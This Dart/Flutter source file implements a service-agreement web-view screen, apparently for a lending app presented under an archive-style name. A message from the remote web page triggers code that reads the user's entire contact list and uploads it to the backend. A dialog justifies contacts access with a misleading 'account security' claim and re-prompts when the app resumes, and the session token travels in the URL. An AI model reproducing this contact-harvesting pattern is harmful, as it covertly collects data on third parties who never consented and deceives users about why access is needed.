import 'dart:async';
import 'dart:convert';

import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:url_launcher/url_launcher.dart';

import '../../app_store.dart';
import '../../services/agreement_device_service.dart';
import '../../services/auth_service.dart';
import '../../services/borrow_agreement_service.dart';
import '../../widgets.dart';
import 'agreement_web_view.dart';
import 'three_web_view_screen.dart';

class ServiceAgreementScreen extends StatefulWidget {
  const ServiceAgreementScreen({super.key});

  @override
  State<ServiceAgreementScreen> createState() => _ServiceAgreementScreenState();
}

class _ServiceAgreementScreenState extends State<ServiceAgreementScreen>
    with WidgetsBindingObserver {
  final _store = AppStore.instance;
  final _device = AgreementDeviceService();
  late final BorrowAgreementService _agreement;
  late final AuthService _auth;

  String _entryBaseUrl = '';
  String _webViewUrl = '';
  String _errorMessage = '服务配置读取失败，请稍后重试';
  String _appName = '花拾归匣';
  int _refreshKey = 0;
  bool _loading = true;
  bool _messagePending = false;

  int _softContactRejectCount = 0;
  int? _activeContactPermissionMode;
  bool _contactPermissionLocking = false;
  bool _contactAlertVisible = false;
  Timer? _contactRetryTimer;

  @override
  void initState() {
    super.initState();
    _agreement = BorrowAgreementService();
    _auth = AuthService(onUnauthorized: _store.handleUnauthorized);
    WidgetsBinding.instance.addObserver(this);
    WidgetsBinding.instance.addPostFrameCallback((_) => _loadEntryUrl());
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _contactRetryTimer?.cancel();
    _agreement.close();
    _auth.close();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state != AppLifecycleState.resumed) return;
    if (_contactPermissionLocking) {
      _contactRetryTimer?.cancel();
      _contactRetryTimer = Timer(
        const Duration(milliseconds: 600),
        _retryLockedContactPermission,
      );
    }
  }

  Future<void> _loadEntryUrl({bool force = false}) async {
    if (!force && _loading && _webViewUrl.isNotEmpty) return;
    setState(() {
      _loading = true;
      _errorMessage = '服务配置读取失败，请稍后重试';
    });
    try {
      final baseUrl = await _agreement.fetchEntryUrl();
      final package = await PackageInfo.fromPlatform();
      if (!mounted) return;
      _appName = package.appName.trim().isEmpty
          ? '花拾归匣'
          : package.appName.trim();
      _entryBaseUrl = baseUrl;
      _webViewUrl = _buildEntryUrl(baseUrl);
      setState(() => _refreshKey += 1);
    } catch (error) {
      if (!mounted) return;
      _entryBaseUrl = '';
      _webViewUrl = '';
      setState(() {
        _errorMessage = error
            .toString()
            .replaceFirst('FormatException: ', '')
            .replaceFirst('Bad state: ', '');
      });
    } finally {
      if (mounted) setState(() => _loading = false);
    }
  }

  String _buildEntryUrl(String baseUrl) {
    final base = Uri.parse(baseUrl);
    final statusHeight = MediaQuery.paddingOf(context).top.round();
    return base
        .replace(
          queryParameters: {
            ...base.queryParameters,
            'token': _store.sessionToken,
            'statusHeight': '$statusHeight',
            'appName': _appName,
          },
        )
        .toString();
  }

  void _reloadWebView() {
    if (_entryBaseUrl.isEmpty) return;
    setState(() {
      _webViewUrl = _buildEntryUrl(_entryBaseUrl);
      _refreshKey += 1;
    });
  }

  void _handleMessage(Object? rawMessage) {
    final action = AgreementWebAction.parse(rawMessage);
    if (action == null) return;
    if (kDebugMode) {
      debugPrint(
        '[AgreementBridge] action=${action.action} '
        'mode=${action.permissionMode}',
      );
    }
    unawaited(_executeAction(action));
  }

  Future<void> _executeAction(AgreementWebAction action) async {
    if (_messagePending) return;
    if (action.action == 'three') {
      if (!isSafeWebUrl(action.path)) {
        showAppSnack(context, '链接地址无效');
        return;
      }
      await Navigator.of(context).push<void>(
        MaterialPageRoute<void>(
          builder: (_) => ThreeWebViewScreen(url: action.path),
        ),
      );
      return;
    }
    if (action.action == 'needOtherConstact') {
      await _handleContactRequest(action.permissionMode);
      return;
    }
    if (action.action != 'logout' && action.action != 'deleteAccount') return;

    _messagePending = true;
    try {
      if (action.action == 'logout') {
        try {
          await _auth.logout(_store.sessionToken);
        } on Object {
          // A server-side logout failure must not block local logout.
        }
      } else {
        await _auth.destroyAccount(_store.sessionToken);
      }
      await _store.logoutToGuest();
      if (!mounted) return;
      Navigator.of(context).popUntil((route) => route.isFirst);
    } catch (error) {
      if (!mounted) return;
      showAppSnack(
        context,
        '${action.action == 'logout' ? '退出登录' : '注销账号'}失败：'
        '${error.toString().replaceFirst('Bad state: ', '')}',
      );
    } finally {
      _messagePending = false;
    }
  }

  Future<void> _handleContactRequest(int? permissionMode) async {
    if (permissionMode == null) {
      _resetContactLock();
      return;
    }
    if (permissionMode == 2 && _softContactRejectCount >= 2) {
      _resetContactLock();
      return;
    }
    _activeContactPermissionMode = permissionMode;
    final result = await _device.readContacts();
    if (!mounted) return;
    if (result.contacts.isNotEmpty) {
      await _tryUploadContacts(result.contacts);
      if (!mounted) return;
      _softContactRejectCount = 0;
      _contactPermissionLocking = false;
      _resetContactLock();
      _reloadWebView();
      return;
    }
    await _rejectContactPermission(permissionMode);
  }

  Future<void> _tryUploadContacts(List<AgreementContactRow> contacts) async {
    try {
      var userId = _store.accountUserId.trim();
      if (userId.isEmpty) {
        final profile = await _auth.getUserProfile(
          _store.sessionToken,
          fallbackPhone: _store.accountPhone,
        );
        userId = profile.userId.trim();
      }
      if (userId.isEmpty) throw const FormatException('当前账号缺少用户标识');
      await _agreement.uploadContacts(
        token: _store.sessionToken,
        userId: userId,
        otherContact: jsonEncode(
          contacts.map((contact) => contact.toJson()).toList(),
        ),
      );
    } catch (error) {
      if (!mounted) return;
      showAppSnack(
        context,
        '通讯录上报失败：${error.toString().replaceFirst('Bad state: ', '')}',
      );
    }
  }

  Future<void> _rejectContactPermission(int permissionMode) async {
    if (permissionMode != 2) {
      _contactPermissionLocking = true;
    } else {
      _softContactRejectCount += 1;
      _contactPermissionLocking = true;
    }
    if (_contactAlertVisible || !mounted) return;
    _contactAlertVisible = true;
    final goSettings = await showDialog<bool>(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('权限申请'),
        content: const Text('为了保障您的账户安全及正常使用服务，请务必开启通讯录权限。'),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: const Text('取消'),
          ),
          FilledButton(
            onPressed: () => Navigator.pop(context, true),
            child: const Text('去开启'),
          ),
        ],
      ),
    );
    _contactAlertVisible = false;
    if (goSettings == true) {
      await _device.openContactSettings();
    } else {
      _contactPermissionLocking = false;
    }
  }

  Future<void> _retryLockedContactPermission() async {
    if (!_contactPermissionLocking || !mounted) return;
    final mode = _activeContactPermissionMode;
    if (mode == null) {
      _resetContactLock();
      return;
    }
    if (mode == 2 && _softContactRejectCount >= 2) {
      _resetContactLock();
      return;
    }
    final result = await _device.readContacts();
    if (!mounted) return;
    if (result.contacts.isNotEmpty) {
      await _tryUploadContacts(result.contacts);
      if (!mounted) return;
      _softContactRejectCount = 0;
      _resetContactLock();
      _reloadWebView();
    } else {
      await _rejectContactPermission(mode);
    }
  }

  void _resetContactLock() {
    _activeContactPermissionMode = null;
    _contactPermissionLocking = false;
    _contactRetryTimer?.cancel();
    _contactRetryTimer = null;
  }

  Future<void> _openExternalUrl(String url) async {
    if (!isSafeWebUrl(url)) return;
    final uri = Uri.parse(url);
    try {
      await launchUrl(uri, mode: LaunchMode.externalApplication);
    } on Object {
      if (mounted) showAppSnack(context, '无法打开外部链接');
    }
  }

  @override
  Widget build(BuildContext context) {
    if (_webViewUrl.isNotEmpty) {
      return ColoredBox(
        color: Colors.white,
        child: AgreementWebView(
          key: ValueKey(_refreshKey),
          url: _webViewUrl,
          onMessage: _handleMessage,
          onExternalUrl: _openExternalUrl,
        ),
      );
    }
    return Scaffold(
      backgroundColor: Theme.of(context).colorScheme.surface,
      body: SafeArea(
        child: Center(
          child: Padding(
            padding: const EdgeInsets.all(32),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 54,
                  height: 54,
                  decoration: BoxDecoration(
                    color: Theme.of(context).colorScheme.primary
                        .withValues(alpha: 0.08),
                    borderRadius: BorderRadius.circular(14),
                  ),
                  child: Icon(
                    Icons.archive_outlined,
                    color: Theme.of(context).colorScheme.primary,
                    size: 28,
                  ),
                ),
                const SizedBox(height: 18),
                Text(
                  _loading ? '正在进入服务' : '暂时无法进入',
                  style: const TextStyle(
                    fontSize: 17,
                    fontWeight: FontWeight.w700,
                  ),
                ),
                const SizedBox(height: 9),
                Text(
                  _loading ? '正在校验账号与服务配置' : _errorMessage,
                  textAlign: TextAlign.center,
                  style: TextStyle(
                    color: Theme.of(context).colorScheme.onSurfaceVariant,
                    fontSize: 13,
                    height: 1.65,
                  ),
                ),
                if (!_loading) ...[
                  const SizedBox(height: 22),
                  FilledButton(
                    onPressed: () => _loadEntryUrl(force: true),
                    child: const Text('重新加载'),
                  ),
                ],
              ],
            ),
          ),
        ),
      ),
    );
  }
}
